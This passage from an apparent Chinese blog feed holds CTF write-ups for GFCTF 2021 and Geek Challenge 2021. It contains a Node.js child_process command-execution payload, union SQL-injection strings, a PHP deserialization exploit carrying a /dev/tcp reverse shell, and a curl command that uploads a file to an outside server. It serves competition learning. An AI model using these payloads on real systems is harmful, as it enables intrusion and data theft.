class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=.</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/11/24/v2r1gJduyFVS8WX.png" alt="image.png"></p><p>发现flag的名字很长，直接读取的话长度不够，而且这里过滤了x，也无法直接利用<code>exec</code>，但是实际上这里是可以绕过的，因为我们通过<code>require</code>导入的模块是一个<code>Object</code>，那么就可以通过<code>Object.values</code>获取到<code>child_process</code>里面的各种方法，那么再通过数组下标<code>[5]</code>就可以得到<code>execSync</code>了，那么有了<code>execSync</code>后就可以通过写入文件的方式读取flag了，<code>payload</code>如下:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">calc[]=<span class="built_in">Object</span>.values(<span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>))[<span class="number">5</span>](<span class="string">&#x27;cat$&#123;IFS&#125;/G*&gt;p&#x27;</span>)&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=.</span><br></pre></td></tr></table></figure><p>遍历一下当前目录发现p已经成功写入，接下来读取p就行了，记得带上回显，用nl读就行：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">calc[]=<span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>).spawnSync(<span class="string">&#x27;nl&#x27;</span>,[<span class="string">&#x27;p&#x27;</span>]).stdout.toString();&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=.</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/11/24/GyBm4cQSOYkNoe7.png" alt="image.png"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>到这儿这两道Web题的分析就写完了，都挺有意思的，还有一道文件查看器难度会稍微大一点，比赛的时候是零解，那道题涉及到的知识点更有意思，快期末考试了，等过段时间再来和大家分享哈哈哈</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;解析2021-GFCTF中的两道Web&quot;&gt;&lt;a href=&quot;#解析2021-GFCTF中的两道Web&quot; class=&quot;headerlink&quot; title=&quot;解析2021 GFCTF中的两道Web&quot;&gt;&lt;/a&gt;解析2021 GFCTF中的两道Web&lt;/h1&gt;&lt;p&gt;上周天我们学校的校赛&lt;code&gt;GFCTF(&lt;/code&gt;原&lt;code&gt;SWPUCTF)12th&lt;/code&gt;顺利举行，我觉得其中的两道Web题都挺有意思的，也是唯一有解的两道Web题，接下来就来聊聊这两道Web题，如果有想复现的师傅可以加qq来私聊找我要哈&lt;/p&gt;</summary>
    
    
    
    
    <category term="ctf" scheme="https://arsenetang.github.io/tags/ctf/"/>
    
    <category term="Web安全" scheme="https://arsenetang.github.io/tags/Web%E5%AE%89%E5%85%A8/"/>
    
    <category term="wp" scheme="https://arsenetang.github.io/tags/wp/"/>
    
  </entry>
  
  <entry>
    <title>WP篇之极客大挑战2021(部分Web)</title>
    <link href="https://arsenetang.github.io/2021/11/19/WP%E7%AF%87%E4%B9%8B%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982021(%E9%83%A8%E5%88%86Web)/"/>
    <id>https://arsenetang.github.io/2021/11/19/WP%E7%AF%87%E4%B9%8B%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982021(%E9%83%A8%E5%88%86Web)/</id>
    <published>2021-11-18T16:00:00.000Z</published>
    <updated>2021-11-19T04:30:37.423Z</updated>
    
    <content type="html"><![CDATA[<h1 id="WP篇之极客大挑战2021-部分Web"><a href="#WP篇之极客大挑战2021-部分Web" class="headerlink" title="WP篇之极客大挑战2021(部分Web)"></a>WP篇之极客大挑战2021(部分Web)</h1><p>又到了一年一度的极客大挑战了，去年作为新生的我被这比赛杀的稀烂，今年虽然自己依然很菜，但起码能多做几道题出来了，能看到自己一步步成长还是挺开心的，接下来我就把做出来的Web题的WP写一下，总共做出了20个web题，打了<code>#</code>号的就是还未做出的，希望大家一起交流学习</p><span id="more"></span><h2 id="1-Dark"><a href="#1-Dark" class="headerlink" title="1.Dark"></a>1.Dark</h2><p>题目地址：<a href="http://c6h35nlkeoew5vzcpsacsidbip2ezotsnj6sywn7znkdtrbsqkexa7yd.onion/">http://c6h35nlkeoew5vzcpsacsidbip2ezotsnj6sywn7znkdtrbsqkexa7yd.onion/</a></p><p>这第一题居然出了一道暗网题我是没想到的，可能想让大家了解一下暗网，接触一些新东西？因为这个网址是<code>onion</code>结尾，一般的浏览器是访问不到的，我们得去下载专门的洋葱浏览器，如下图所示，然后安装好连接上就行了</p><p><img src="https://i.loli.net/2021/10/19/qztpoaOYrfumIKd.png" alt="image.png"></p><p><img src="https://i.loli.net/2021/10/19/Fjt8sDw3Prz5BLg.png" alt="image.png"></p><h2 id="2-Welcome2021"><a href="#2-Welcome2021" class="headerlink" title="2.Welcome2021"></a>2.Welcome2021</h2><p>题目地址：<a href="http://1.14.102.22:8011/">http://1.14.102.22:8011/</a></p><p>这就是道常规题了，先用burp抓个包，放到重发器里面，发包</p><p><img src="https://i.loli.net/2021/10/19/k5jSOLVugyHrUsJ.png" alt="image.png"></p><p>叫我们用<code>WELCOME</code>请求方法请求网页，关于请求方法大家就自行百度了哈，那我们就直接把GET改成<code>WELCOME</code>再发包</p><p><img src="https://i.loli.net/2021/10/19/ibjlkLEaNp9y8Ce.png" alt="image.png"></p><p>访问它就好了，成功拿下</p><p><img src="https://i.loli.net/2021/10/19/mq7sJh9xTnMBkag.png" alt="image.png"></p><h2 id="3-babysql"><a href="#3-babysql" class="headerlink" title="3.babysql"></a>3.babysql</h2><p>题目地址：<a href="http://47.100.242.70:4339/index.php">http://47.100.242.70:4339/index.php</a></p><p>一道比较简单的，没有过滤的联合过滤，这里有个坑点就是flag不在当前库中，所以说查询的时候要加上库名</p><p>正常页面：</p><p><img src="https://i.loli.net/2021/10/19/7SCRXYp2aFPsdAg.png" alt="image.png"></p><p>错误页面：</p><p><img src="https://i.loli.net/2021/10/19/z9uB5x6oLdTpnAK.png" alt="image.png"></p><p>然后在单引号后面加一个注释符就又恢复成正常页面了，基本上可以确定这里存在注入点了，那接下来就一套联合注入梭哈了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">判断列数：admin&#x27; order by 4 # </span><br><span class="line">正常 </span><br><span class="line">admin&#x27; order by 5 # </span><br><span class="line">报错 </span><br><span class="line">列数为4列</span><br><span class="line"></span><br><span class="line">判断回显位：admin &#x27; and 0 union select 1,2,3,4 # </span><br><span class="line">回显位为1和2</span><br><span class="line"></span><br><span class="line">判断库名：admin&#x27; and 0 union select group_concat(schema_name),2,3,4 from information_schema.schemata#  </span><br><span class="line">库名为flag</span><br><span class="line"></span><br><span class="line">判断表名：admin&#x27; and 0 union select group_concat(table_name),2,3,4 from information_schema.tables where table_schema=&#x27;flag&#x27;# </span><br><span class="line">表名为fllag</span><br><span class="line"></span><br><span class="line">判断列名：admin&#x27; and 0 union select group_concat(column_name),2,3,4 from information_schema.columns where table_schema=&#x27;flag&#x27;# </span><br><span class="line">列名为fllllllag</span><br><span class="line"></span><br><span class="line">注数据拿flag：admin&#x27; and 0 union select group_concat(fllllllag),2,3,4 from flag.fllag#</span><br><span class="line">flag：SYC&#123;U_4N0vv_Sql_Noyv~&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/10/19/DskQg8KpyGcXlOj.png" alt="image.png"></p><h2 id="4-babyPOP"><a href="#4-babyPOP" class="headerlink" title="4.babyPOP"></a>4.babyPOP</h2><p>题目地址：<a href="http://1.14.102.22:8114/">http://1.14.102.22:8114</a></p><p>一道PHP反序列化中pop链的构造问题，这道题比较恶心的是<code>exec</code>执行命令是无回显的，得把shell弹出来才行，源码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">a</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="variable">$Do_u_like_JiaRan</span> = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="variable">$Do_u_like_AFKL</span> = <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">b</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$i_want_2_listen_2_MaoZhongDu</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (a::<span class="variable">$Do_u_like_AFKL</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> exec(<span class="keyword">$this</span>-&gt;i_want_2_listen_2_MaoZhongDu);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;Noooooooooooooooooooooooooooo!!!!!!!!!!!!!!!!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">c</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        a::<span class="variable">$Do_u_like_JiaRan</span> = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">d</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        a::<span class="variable">$Do_u_like_AFKL</span> = <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;关注嘉然,&quot;</span> . <span class="keyword">$this</span>-&gt;value;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">e</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (a::<span class="variable">$Do_u_like_JiaRan</span>) &#123;</span><br><span class="line">            (<span class="keyword">$this</span>-&gt;afkl)();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;Noooooooooooooooooooooooooooo!!!!!!!!!!!!!!!!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;data&#x27;</span>])) &#123;</span><br><span class="line">    unserialize(base64_decode(<span class="variable">$_GET</span>[<span class="string">&#x27;data&#x27;</span>]));</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>遇到POP链的问题肯定是先找链子的起点和终点，这里的起点是一个GET传参，然后会对它做一个<code>unserialize</code>操作，终点就在b类中的<code>__toString()</code>中，里面有一个<code>exec</code>函数可以执行命令；然后从终点往前跳，可以看到d类中的<code>__invoke()</code>方法里面有一个对象与字符串的拼接，可以调<code>__toString()</code>；再往前看，e类中的<code>__destruct</code>函数里面的<code>($this-&gt;afkl)()</code>可以调<code>__invoke</code>；然后在对象销毁时会自动调用<code>__destruct()</code>，这样一条链子就成型了，我们开始写exp：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">b</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$i_want_2_listen_2_MaoZhongDu</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;i_want_2_listen_2_MaoZhongDu=<span class="string">&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/yourip/port 0&gt;&amp;1&#x27;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">c</span> </span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">d</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$value</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;value=<span class="keyword">new</span> b();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">e</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$afkl</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;a=<span class="keyword">new</span> c();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;afkl=<span class="keyword">new</span> d();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$ars</span>=<span class="keyword">new</span> e();</span><br><span class="line"><span class="keyword">echo</span> base64_encode(serialize(<span class="variable">$ars</span>));</span><br></pre></td></tr></table></figure><p>这道题可能有点疑惑的地方就是它链子的起点并不是从<code>__wakeup()</code>开始的，而是直接从<code>__desctruct()</code>开始的，而将c类连进来仅仅是为了给<code>$Do_u_like_JiaRan</code>赋值，让它为true就行，然后用跑出来的结果直接打就行，别忘了在服务器上监听端口</p><p><img src="https://i.loli.net/2021/10/19/kPB9hlQS5YxfsLy.png" alt="image.png"></p><h2 id="5-where-is-my-FUMO"><a href="#5-where-is-my-FUMO" class="headerlink" title="5.where_is_my_FUMO"></a>5.where_is_my_FUMO</h2><p>题目地址：<a href="http://1.14.102.22:8115/">http://1.14.102.22:8115/</a></p><p>一道很有意思的反弹shell的题，先反弹shell然后想办法把图片利用<code>curl</code>上传到自己的服务器上</p><p>关于反弹shell可以先看看这篇文章:<a href="https://xz.aliyun.com/t/2549">https://xz.aliyun.com/t/2549</a></p><p>首先看看题目源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">chijou_kega_no_junnka</span>(<span class="params"><span class="variable">$str</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$black_list</span> = [<span class="string">&quot;&gt;&quot;</span>, <span class="string">&quot;;&quot;</span>, <span class="string">&quot;|&quot;</span>, <span class="string">&quot;&#123;&quot;</span>, <span class="string">&quot;&#125;&quot;</span>, <span class="string">&quot;/&quot;</span>, <span class="string">&quot; &quot;</span>];</span><br><span class="line">    <span class="keyword">return</span> str_replace(<span class="variable">$black_list</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;DATA&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$data</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;DATA&#x27;</span>];</span><br><span class="line">    <span class="variable">$addr</span> = chijou_kega_no_junnka(<span class="variable">$data</span>[<span class="string">&#x27;ADDR&#x27;</span>]);</span><br><span class="line">    <span class="variable">$port</span> = chijou_kega_no_junnka(<span class="variable">$data</span>[<span class="string">&#x27;PORT&#x27;</span>]);</span><br><span class="line">    exec(<span class="string">&quot;bash -c \&quot;bash -i &lt; /dev/tcp/<span class="subst">$addr</span>/<span class="subst">$port</span>\&quot;&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>可以看出，当我们以数组的形式输入ip地址和端口之后，它就可以直接反弹shell了</p><p><img src="https://i.loli.net/2021/10/19/A7VayPEqlpYTSF2.png" alt="image.png"></p><p>就像这样传入参数，然后在服务器那边监听端口，就会发现shell已经反弹过去了，但这里有一个坑点，如下图：</p><p><img src="https://i.loli.net/2021/10/19/n35dKuepbSZFlqL.png" alt="image.png"></p><p>这个反弹shell的命令乍一看没啥问题，但它把大于号改成了小于号，也就是说它将输出重定向到了它的服务器而不是我们的服务器，那么这个命令虽然被执行了，但输出是在它的服务器上，我们是看不到回显的，这时候我们该怎么办呢？再进行一遍正常的弹shell！！让它把命令执行的结果重定向到我们的服务器上，才能看到回显的，如下图所示：</p><p><img src="https://i.loli.net/2021/10/19/13pLEUKRvlzmy9d.png" alt="image.png"></p><p>这样我们就可以正常执行命令而且可以看到回显啦，那么现在问题又来了，虽然说可以看到回显，但flag是在根目录下而且是一张图片，flag.png，我们在命令行肯定是没有办法直接看图片的，得想个办法把这个图片传输出来，传输到我们自己得服务器上，然后再通过我们自己的服务器把图片下载到本地，才能看到，还好，它没有ban掉<code>curl</code>，那我们就可以通过curl来传输了</p><p><img src="https://i.loli.net/2021/10/19/8O6ABIvegNctoDV.png" alt="image.png"></p><p>具体的传输方法请看这篇文章：<a href="https://blog.csdn.net/bjbs_270/article/details/710833122">https://blog.csdn.net/bjbs_270/article/details/710833122</a>，打极客大挑战就是一个不断学习的过程，可以从中学到很多很多有意思的新东西哈哈哈</p><p>这篇文章的大概意思就是在接收端新建一个<code>php</code>文件，源码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//highlight_file(__FILE__);</span></span><br><span class="line"><span class="variable">$uploaddir</span> = <span class="string">&#x27;/var/www/html/&#x27;</span>;</span><br><span class="line"><span class="variable">$uploadfile</span> = <span class="variable">$uploaddir</span> . basename(<span class="variable">$_FILES</span>[<span class="string">&#x27;userfile&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line"> </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span> (move_uploaded_file(<span class="variable">$_FILES</span>[<span class="string">&#x27;userfile&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="variable">$uploadfile</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;File is valid, and was successfully uploaded.\n&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Possible file upload attack!\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Here is some more debugging info:&#x27;</span>;</span><br><span class="line">print_r(<span class="variable">$_FILES</span>);</span><br><span class="line"> </span><br><span class="line"><span class="keyword">print</span> <span class="string">&quot;&lt;/pre&gt;&quot;</span>;</span><br><span class="line"> </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>我把它放到了docker里面，命名为upload.php，然后在shell里面执行<code>curl -F &quot;userfile=@/flag.png&quot; http://youip/upload.php</code>就成功的把flag.png上传到我的docker里面了，那我们直接访问就可以看到了：</p><p><img src="https://i.loli.net/2021/10/19/TWXhe4s23tAmMoQ.png" alt="image.png"></p><h2 id="6-babyphp"><a href="#6-babyphp" class="headerlink" title="6.babyphp"></a>6.babyphp</h2><p>题目地址：<a href="http://47.100.242.70:4659/">http://47.100.242.70:4659/</a></p><p>一道比较简单的<code>ssrf</code>，用<code>file://</code>伪协议去读取文件</p><p>首先进去之后<code>f12</code>查看源代码，找到一句注释<code> why not read robots?</code>，那我们就先查看<code>robots.txt</code>，发现里面有一句<code>/noobcurl.php</code>，那就直接访问它了，看到了源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span 